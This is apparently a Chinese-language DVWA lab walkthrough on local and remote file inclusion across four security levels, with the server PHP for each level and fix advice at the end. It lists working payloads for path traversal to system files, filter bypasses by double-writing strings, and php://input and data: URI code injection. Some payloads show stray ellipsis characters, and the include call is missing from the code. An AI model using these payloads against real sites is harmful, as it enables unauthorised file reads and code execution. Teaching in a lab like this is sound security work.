0x01 漏洞概述

​ 文件包含是指应用程序加载的文件（本地/远程）可以由用户提交的数据控制，从而导致攻击者控制恶意文件在服务器上执行。

0x03 漏洞测试

Low级别

设置 DVWA 安全级别为 LOW 。

服务器端核心代码：

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

?>
  • 代码直接读取 page 参数同时使用 include 进行文件包含执行

漏洞利用：

  • 使用浏览器发起本地文件包含攻击，payload：
../../../../../../../../../../etc/password
c:\\windows\win.ini
  • 使用浏览器发起远程文件包含攻击

Medium级别

​ 设置 DVWA 安全级别为 Medium。

服务器端核心代码：

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
$file = str_replace( array( "http://", "https://" ), "", $file );
$file = str_replace( array( "../", "..\"" ), "", $file );

?>
  • 清除 page 参数中的 http://、 https://、 ../、 ..\字符串, 可以使用 php://input， php://filter,
    data url schema等进行注入，也可使用替换逻辑漏洞(只替换一次)将被替换字符串迭代使用，例如 hthttp://tp://被替换后为http://

漏洞利用：

  • 使用浏览器发起本地文件包含攻击，payload：
…/./…/./…/./…/./…/./…/./…/./…/./…/./…/./etc/password
….//….//….//….//….//….//….//….//….//….//etc/password
  • 使用浏览器发起远程文件包含攻击，payload：
hthttp://tp://localhost:9999/file_include_low.php
php://input <?php phpinfo();
data:text/plain;charset=utf-8,<?php phpinfo();

High级别

​ 设置 DVWA 安全级别为 High。

服务器端核心代码：

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Input validation
if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
  • 对提交参数进行检查，只允许include.php以及 file开头的文件被包含，只能包含本地file开头的文件或配合文件上传漏洞组合进行利用

Impossible级别

​ 设置 DVWA 安全级别为 Impossible。

服务器端核心代码：

<?php

// The page we wish to display
$file = $_GET[ 'page' ];

// Only allow include.php or file{1..3}.php
if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
    // This isn't the page we want!
    echo "ERROR: File not found!";
    exit;
}

?>
  • 使用白名单，防止文件包含执行除此以外的文件。

0x04 修复建议

  • 使用白名单列表限制被包含文件
  • 关闭远程文件包含功能
  • 避免 web 服务器启动用户权限过高
